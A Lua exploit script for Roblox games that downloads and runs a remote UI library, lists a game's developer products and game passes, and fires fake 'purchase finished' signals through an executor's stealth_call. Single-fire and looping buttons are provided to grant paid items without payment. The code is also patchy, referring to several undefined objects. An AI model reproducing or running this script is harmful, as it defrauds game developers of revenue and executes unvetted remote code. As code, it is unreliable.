local Library = loadstring(Game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/wizard"))()
 
local Window = Library:NewWindow("arbix")
 
local PurchaseSection = Window:NewSection("Dev proudcut")
    local x_x = HttpService:JSONDecode(game:HttpGet(
        "https://apis.roblox.com/developer-products/v1/developer-products/list?universeId=" .. game.GameId .. "&page=1"))
    local dnames = {}
    local dproductIds = {}
    if type(x_x.DeveloperProducts) == "nil" then
        table.insert(dnames, " ")
    end

    pcall(function()

        local currentPage = 1

        repeat
            local response = game:HttpGet(
                "https://apis.roblox.com/developer-products/v1/developer-products/list?universeId=" ..
                    tostring(game.GameId) .. "&page=" .. tostring(currentPage))
            local decodedResponse = HttpService:JSONDecode(response)
            local developerProducts = decodedResponse.DeveloperProducts
            print("Page " .. currentPage .. ":")
            for _, developerProduct in pairs(developerProducts) do
                table.insert(dnames, developerProduct.Name)
                table.insert(dproductIds, developerProduct.ProductId)
            end
            currentPage = currentPage + 1
            local final = decodedResponse.FinalPage
        until final

    end)
    local index
    purchase:Dropdown("Below is a list of all DevProducts in this game!", dnames, function(x)
        index = nil
        for i, name in ipairs(dnames) do
            if name == x then
                index = i
                break
            end
        end
    end)
    getgenv().wyvernlooppurchases = false
    PurchaseSection:CreateToggle("Loop", function(bool)
        getgenv().wyvernlooppurchases = bool
        while getgenv().wyvernlooppurchases == true and task.wait() do
            if index then
                local product = dproductIds[index]
                pcall(function()
                    stealth_call('MarketplaceService:SignalPromptProductPurchaseFinished(game.Players.LocalPlayer.UserId, ' ..product .. ', true) ')
                end)
            end
        end
    end)
    PurchaseSection:CreateButton("Fire", function()
        if index then
            local product = dproductIds[index]
            pcall(function()
                stealth_call(
                    'MarketplaceService:SignalPromptProductPurchaseFinished(game.Players.LocalPlayer.UserId, ' ..
                        product .. ', true) ')
            end)
            task.wait(0.2)
            if not Visit:FindFirstChild("LocalScript") then
                print("Error", "Your executor blocked function SignalPromptProductPurchaseFinished.",
                    "Okay!")
            else
                print("Success",
                    "Fired PromptProductPurchaseFinished signal to server with productId: " .. tostring(product),
                    "Okay!")
                Visit:FindFirstChild("LocalScript"):Destroy()
            end
        else
            print("Error", "Something went wrong but I don't know what.", "Okay!")
        end
    end)
    Section:CreateButton("Fire All Dev Products", function()
        getrenv()._set = clonefunction(setthreadidentity)
        local starttickcc = tick()
        for i, product in pairs(dproductIds) do
            task.spawn(function()
                pcall(function()
                    stealth_call(
                        'MarketplaceService:SignalPromptProductPurchaseFinished(game.Players.LocalPlayer.UserId, ' ..
                            product .. ', true) ')
                end)
            end)
            task.wait()
        end
        local endtickcc = tick()
        local durationxd = endtickcc - starttickcc
        print("Attempt", "Fired All Dev Products! Took ".. tostring(durationxd)  .. " Seconds!", "Okay!")
    end)
    getgenv().wyvernlooppurchases2 = false
    Section:CreateToggle("Loop All Dev Products", function(bool)
        getgenv().wyvernlooppurchases2 = bool
        while getgenv().wyvernlooppurchases2 == true and task.wait() do
            for i, product in pairs(dproductIds) do
                task.spawn(function()
                    pcall(function()
                        stealth_call('MarketplaceService:SignalPromptProductPurchaseFinished(game.Players.LocalPlayer.UserId, ' ..product .. ', true) ')
                    end)
                end)
                task.wait()
            end
        end
    end)
    purchase:Seperator()
    local wyverngamepass = game.HttpService:JSONDecode(game:HttpGet(
        "https://games.roblox.com/v1/games/" .. game.GameId .. "/game-passes?limit=100&sortOrder=1"))
    local gnames = {}
    local gproductIds = {}
    for i, v in pairs(wyverngamepass.data) do
        table.insert(gnames, v.name)
        table.insert(gproductIds, v.id)
    end
    local gamepass
    purchase:Dropdown("Below is a list of all GamePass in this game!", gnames, function(x)
        for i, name in ipairs(gnames) do
            if name == x then
                gamepass = gproductIds[i]
                break
            end
        end

    end)
    purchase:Label("If nothing shows above, no GamePass found.")
    purchase:Button("Fire Selected Gamepass", function()
        if gamepass then
            pcall(function()
                stealth_call('MarketplaceService:SignalPromptGamePassPurchaseFinished(game.Players.LocalPlayer, ' ..
                                 tostring(gamepass) .. ', true)')
            end)
            task.wait(0.2)
            if not Visit:FindFirstChild("LocalScript") then
                discord:Notification("Error", "Your executor blocked function SignalPromptGamePassPurchaseFinished.",
                    "Okay!")
            else
                discord:Notification("Success",
                    "Fired PromptProductGamePassPurchaseFinished signal to server with productId: " ..
                        tostring(gamepass), "Okay!")
                Visit:FindFirstChild("LocalScript"):Destroy()
            end
        else
            discord:Notification("Error", "Something went wrong but I don't know what.", "Okay!")
        end
    end)
    purchase:Seperator()
    purchase:Label("Signals to server that an item purchase failed.")
    purchase:Label("This can trick servers to reprompt an item!")
    local returnvalprompt = false
    purchase:Toggle("Item Purchase Success Return Value", returnvalprompt, function(bool)
        returnvalprompt = bool
    end)
